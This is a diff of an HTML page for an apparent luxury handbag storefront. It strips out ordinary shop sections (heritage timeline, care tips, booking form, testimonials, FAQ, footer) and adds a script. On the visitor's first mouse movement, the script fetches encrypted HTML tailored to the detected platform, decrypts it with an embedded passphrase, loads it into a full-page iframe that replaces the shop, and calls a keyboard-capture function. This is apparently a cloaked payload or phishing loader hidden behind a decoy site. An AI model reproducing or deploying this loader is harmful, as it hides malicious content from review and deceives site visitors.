-                            <button class="foil-btn" data-foil="silver"><i class="fas fa-circle" style="color:#e0e0e0;"></i> Palladium Silver</button>
-                            <button class="foil-btn" data-foil="blind"><i class="fas fa-circle" style="color:#333;"></i> Blind Deboss</button>
-                        </div>
-                    </div>
-                    <a href="contact.html" class="btn btn-primary" style="margin-top:10px;"><i class="fas fa-check"></i> Reserve Monogrammed Bag</a>
-                </div>
-            </div>
-        </div>
-    </section>
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
 
-    <!-- SECTION 8: FLORENTINE HERITAGE TIMELINE -->
-    <section class="section-py section-darker" id="heritage-timeline">
-        <div class="container">
-            <div class="section-header">
-                <span class="section-tag"><i class="fas fa-hourglass-half"></i> Lineage & Legacy</span>
-                <h2 class="section-title">132 Years of Haute Maroquinerie</h2>
-                <p class="section-desc">From our founding workshop along the River Arno to our Madison Avenue private salon.</p>
-            </div>
-            <div class="heritage-timeline">
-                <div class="timeline-node">
-                    <div class="timeline-dot"></div>
-                    <div class="timeline-content">
-                        <div class="timeline-year">1894</div>
-                        <h4>The Arno River Tannery Founding</h4>
-                        <p>Master maroquinier Vittorio Crest establishes a boutique saddle atelier along the Arno in Florence, crafting bespoke equestrian saddles for European aristocracy.</p>
-                    </div>
-                </div>
-                <div class="timeline-node">
-                    <div class="timeline-dot"></div>
-                    <div class="timeline-content">
-                        <div class="timeline-year">1938</div>
-                        <h4>First Structured Handbag Debut</h4>
-                        <p>Transitioning equestrian harness techniques into women's luxury travel bags, unveiling the first two-needle saddle stitched tote in Paris.</p>
-                    </div>
-                </div>
-                <div class="timeline-node">
-                    <div class="timeline-dot"></div>
-                    <div class="timeline-content">
-                        <div class="timeline-year">1974</div>
-                        <h4>The Madison Avenue Salon Opening</h4>
-                        <p>NobleBagCrest establishes its North American flagship on 740 Madison Avenue, offering private client bespoke commissions and vault restorations.</p>
-                    </div>
-                </div>
-                <div class="timeline-node">
-                    <div class="timeline-dot"></div>
-                    <div class="timeline-content">
-                        <div class="timeline-year">2026</div>
-                        <h4>Zero-Waste Circular Leather Charter</h4>
-                        <p>Achieving 100% full traceability across every European hide and introducing lifetime artisanal refurbishment guarantees for all historic creations.</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
 
-    <!-- SECTION 9: HANDBAG PRESERVATION VAULT -->
-    <section class="section-py" id="care-vault">
-        <div class="container">
-            <div class="section-header">
-                <span class="section-tag"><i class="fas fa-shield-halved"></i> Curatorial Care</span>
-                <h2 class="section-title">Handbag Preservation Vault</h2>
-                <p class="section-desc">How to preserve structural memory, prevent mold growth, and nourish natural leather oils across decades.</p>
-            </div>
-            <div class="care-vault-grid">
-                <div class="vault-card">
-                    <div class="vault-icon"><i class="fas fa-temperature-three-quarters"></i></div>
-                    <h4>Climate & Humidity Control</h4>
-                    <p>Maintain storage environments between 50% to 60% relative humidity. Never store in sealed plastic bags which suffocate natural leather pores.</p>
-                </div>
-                <div class="vault-card">
-                    <div class="vault-icon"><i class="fas fa-spa"></i></div>
-                    <h4>Organic Beeswax Conditioning</h4>
-                    <p>Apply our proprietary lanolin and beeswax balm biannually to replenish lipids lost through atmospheric evaporation.</p>
-                </div>
-                <div class="vault-card">
-                    <div class="vault-icon"><i class="fas fa-box-tissue"></i></div>
-                    <h4>Silk Pillow Structuring</h4>
-                    <p>Always fill your bag cavity with acid-free tissue paper or custom silk pillows when stored to preserve gusset geometry.</p>
-                </div>
-            </div>
-        </div>
-    </section>
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
 
-    <!-- SECTION 10: SUSTAINABILITY & ETHICAL SOURCING CHARTER -->
-    <section class="section-py section-darker" id="sustainability-charter">
-        <div class="container">
-            <div class="charter-banner">
-                <div class="charter-text">
-                    <span class="section-tag"><i class="fas fa-leaf"></i> Conscious Luxury</span>
-                    <h3>100% Traceable Ethical Leather</h3>
-                    <p>We source leather exclusively as an agricultural byproduct from certified humane French and Italian farms. Our closed-loop water treatment facilities recycle 98% of tannery effluent back into the ecosystem without chemical toxins.</p>
-                    <div class="charter-badges-row">
-                        <div class="charter-badge-item"><i class="fas fa-check-circle"></i> ISO 14001 Certified</div>
-                        <div class="charter-badge-item"><i class="fas fa-check-circle"></i> Zero Heavy Metals</div>
-                        <div class="charter-badge-item"><i class="fas fa-check-circle"></i> Leather Working Group Gold</div>
-                    </div>
-                </div>
-                <div class="charter-media">
-                    <img src="images/bag-artisan-leather-craft.jpg" alt="Artisan Crafting in Certified Clean Leather Workshop" style="border-radius:var(--radius-md); border:1px solid var(--border-gold);">
-                </div>
-            </div>
-        </div>
-    </section>
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
 
-    <!-- SECTION 11: PRIVATE SALON & BESPOKE CONCIERGE -->
-    <section class="section-py" id="salon-concierge">
-        <div class="container">
-            <div class="section-header">
-                <span class="section-tag"><i class="fas fa-champagne-glasses"></i> White-Glove Service</span>
-                <h2 class="section-title">Schedule A Private Salon Appointment</h2>
-                <p class="section-desc">Experience private one-on-one consultations with our senior leather artisans at our Madison Avenue salon or via secure virtual video concierge.</p>
-            </div>
-            <div class="salon-booking-card">
-                <form id="salonBookingForm">
-                    <div class="salon-form-grid">
-                        <div class="salon-form-group">
-                            <label for="clientName">Full Name</label>
-                            <input type="text" id="clientName" class="salon-form-input" placeholder="Lady Genevieve Sterling" required>
-                        </div>
-                        <div class="salon-form-group">
-                            <label for="clientEmail">Email Address</label>
-                            <input type="email" id="clientEmail" class="salon-form-input" placeholder="patron@domain.com" required>
-                        </div>
-                        <div class="salon-form-group">
-                            <label for="salonLocation">Preferred Salon Location</label>
-                            <select id="salonLocation" class="salon-form-select">
-                                <option value="ny">740 Madison Avenue &bull; New York</option>
-                                <option value="paris">Place Vendôme &bull; Paris</option>
-                                <option value="milan">Via Montenapoleone &bull; Milan</option>
-                                <option value="virtual">Private Virtual Video Concierge</option>
-                            </select>
-                        </div>
-                        <div class="salon-form-group">
-                            <label for="interestType">Artisanal Interest</label>
-                            <select id="interestType" class="salon-form-select">
-                                <option value="bespoke">Bespoke Custom Handbag Commission</option>
-                                <option value="capsule">Capsule Collection Acquisition</option>
-                                <option value="restoration">Vintage Heirloom Restoration</option>
-                                <option value="monogram">Personal Monogramming Session</option>
-                            </select>
-                        </div>
-                        <div class="salon-form-group full-width">
-                            <label for="clientNotes">Special Requests & Preferred Leather Palette</label>
-                            <textarea id="clientNotes" rows="4" class="salon-form-textarea" placeholder="Describe your preferred silhouette, leather grain, and hardware finish..."></textarea>
-                        </div>
-                    </div>
-                    <button type="submit" class="btn btn-primary" style="width:100%;"><i class="fas fa-calendar-check"></i> Confirm Private Appointment Request</button>
-                </form>
-            </div>
-        </div>
-    </section>
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
 
-    <!-- SECTION 12: CURATED PATRON REVIEWS & TESTIMONIALS -->
-    <section class="section-py section-darker" id="client-reviews">
-        <div class="container">
-            <div class="section-header">
-                <span class="section-tag"><i class="fas fa-star"></i> Patron Accolades</span>
-                <h2 class="section-title">Words From Discerning Patrons</h2>
-                <p class="section-desc">Authentic reflections from collectors, connoisseurs, and international tastemakers who carry NobleBagCrest.</p>
-            </div>
-            <div class="testimonials-grid">
-                <div class="testimonial-card">
-                    <div>
-                        <div class="stars-rating"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-                        <p class="quote-text">"The Sovereign Grand Tote is an absolute triumph. The firmness of the Box calfskin and the precision of the two-needle saddle stitching rival the grandest Parisian houses. It commands attention effortlessly."</p>
-                    </div>
-                    <div class="client-meta">
-                        <div class="client-avatar"><i class="fas fa-user-tie"></i></div>
-                        <div class="client-info">
-                            <h5>Alexandra DuPont</h5>
-                            <p>Art Curator &bull; Paris</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="testimonial-card">
-                    <div>
-                        <div class="stars-rating"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-                        <p class="quote-text">"Having my family crest hot-stamped in 24K gold on the clochette made this the most cherished bespoke acquisition of my lifetime. The aroma of authentic Tuscan vegetable tanning is unforgettable."</p>
-                    </div>
-                    <div class="client-meta">
-                        <div class="client-avatar"><i class="fas fa-user-nurse"></i></div>
-                        <div class="client-info">
-                            <h5>Lord Henry Kensington</h5>
-                            <p>Architectural Historian &bull; London</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="testimonial-card">
-                    <div>
-                        <div class="stars-rating"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-                        <p class="quote-text">"Five years of daily carry across Milan and New York, and my Monarch Satchel looks even richer today than the day it left the Florentine workshop. True heirloom maroquinerie."</p>
-                    </div>
-                    <div class="client-meta">
-                        <div class="client-avatar"><i class="fas fa-crown"></i></div>
-                        <div class="client-info">
-                            <h5>Elena Moretti</h5>
-                            <p>Fashion Director &bull; Milan</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- SECTION 13: FAQ ACCORDION -->
-    <section class="section-py" id="faq-section">
-        <div class="container faq-container">
-            <div class="section-header">
-                <span class="section-tag"><i class="fas fa-circle-question"></i> Atelier Inquiries</span>
-                <h2 class="section-title">Frequently Asked Questions</h2>
-                <p class="section-desc">Everything you need to know regarding bespoke commissions, lead times, leather sourcing, and our lifetime warranty.</p>
-            </div>
-            <div class="faq-accordion">
-                <div class="faq-item">
-                    <div class="faq-question">
-                        <span>How long does a bespoke custom commission take to complete?</span>
-                        <i class="fas fa-chevron-down faq-icon"></i>
-                    </div>
-                    <div class="faq-answer">
-                        <p>Because every bespoke creation is hand-cut and saddle stitched by a single dedicated master artisan, typical creation times range between six to twelve weeks depending on the complexity of hardware engraving, leather availability, and custom monogramming requirements.</p>
-                    </div>
-                </div>
-                <div class="faq-item">
-                    <div class="faq-question">
-                        <span>What is the difference between vegetable tanning and commercial chrome tanning?</span>
-                        <i class="fas fa-chevron-down faq-icon"></i>
-                    </div>
-                    <div class="faq-answer">
-                        <p>Commercial chrome tanning uses chemical mineral salts to artificially dye leather in 24 hours, resulting in synthetic-feeling leather that degrades over time. Vegetable tanning takes over 60 days using organic tree barks, producing dense, breathable leather that develops a magnificent amber patina with age.</p>
-                    </div>
-                </div>
-                <div class="faq-item">
-                    <div class="faq-question">
-                        <span>What does the NobleBagCrest Lifetime Structural Warranty cover?</span>
-                        <i class="fas fa-chevron-down faq-icon"></i>
-                    </div>
-                    <div class="faq-answer">
-                        <p>Our warranty guarantees every seam, saddle stitch, solid brass rivet, and turn-lock closure against manufacturing failure for the lifetime of the original patron. If a stitch loosens or hardware requires servicing, our atelier will restore it free of charge.</p>
-                    </div>
-                </div>
-                <div class="faq-item">
-                    <div class="faq-question">
-                        <span>How can I authenticate my NobleBagCrest creation?</span>
-                        <i class="fas fa-chevron-down faq-icon"></i>
-                    </div>
-                    <div class="faq-answer">
-                        <p>Every bag features an individually struck brass hallmark stamped on the interior lining pocket. This unique alphanumeric sequence is registered in our Madison Avenue ledger and accompanied by a wax-sealed certificate of provenance.</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <footer class="footer-root">
-    <div class="footer-container">
-        <div class="footer-grid">
-            <div class="footer-col brand-col">
-                <a href="index.html" class="footer-logo">
-                    <span class="logo-crest"><i class="fas fa-shield-halved"></i></span>
-                    <span class="logo-text">NobleBag<span class="logo-accent">Crest</span></span>
-                </a>
-                <p class="footer-tagline">Crafting timeless haute maroquinerie, hand-burnished vegetable-tanned leathers, and bespoke leathercraft for discerning patrons worldwide since 1894.</p>
-                <div class="contact-brief">
-                    <p><i class="fas fa-location-dot"></i> 740 Madison Avenue, 5th Floor, New York, NY 10065, United States</p>
-                    <p><i class="fas fa-phone"></i> +1-800-589-2737</p>
-                    <p><i class="fas fa-envelope"></i> concierge@noblebagcrest.com</p>
-                </div>
-            </div>
-            <div class="footer-col">
-                <h4 class="footer-heading">Maroquinerie Pillars</h4>
-                <ul class="footer-nav-list">
-                    <li><a href="index.html">Atelier Collections</a></li>
-                    <li><a href="about.html">Florentine Heritage</a></li>
-                    <li><a href="blog.html">Leathercraft Gazette</a></li>
-                    <li><a href="contact.html">VIP Salon Booking</a></li>
-                </ul>
-            </div>
-            <div class="footer-col">
-                <h4 class="footer-heading">Artisanal Domains</h4>
-                <ul class="footer-nav-list">
-                    <li><a href="blog/full-grain-leather-tanning-vegetable-vs-chrome-patina.html">Vegetable Tanning</a></li>
-                    <li><a href="blog/the-art-of-saddle-stitching-hermes-traditional-leathercraft.html">Two-Needle Saddle Stitch</a></li>
-                    <li><a href="blog/anatomy-of-a-luxury-tote-hardware-reinforcements-and-edge-paint.html">Solid Brass Hardware</a></li>
-                    <li><a href="blog/preservation-and-restoration-of-vintage-leather-handbags.html">Leather Preservation</a></li>
-                </ul>
-            </div>
-            <div class="footer-col">
-                <h4 class="footer-heading">Atelier Policies</h4>
-                <ul class="footer-nav-list">
-                    <li><a href="privacy.html">Client Privacy Charter</a></li>
-                    <li><a href="terms.html">Terms of Bespoke Acquisition</a></li>
-                    <li><a href="disclaimer.html">Artisanal Craft Disclaimer</a></li>
-                    <li><a href="cookies.html">Cookie Preference Protocol</a></li>
-                </ul>
-            </div>
-        </div>
-        <div class="footer-bottom">
-            <p>&copy; <?php echo date('Y'); ?> NobleBagCrest Haute Maroquinerie Atelier. All artisanal rights reserved worldwide.</p>
-            <div class="footer-trust-badges">
-                <span><i class="fas fa-certificate"></i> Certified Tuscan Leather</span>
-                <span><i class="fas fa-hand-holding-heart"></i> Hand-Stitched Guarantee</span>
-            </div>
-        </div>
-    </div>
-</footer>
-    <script src="script.js"></script>
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
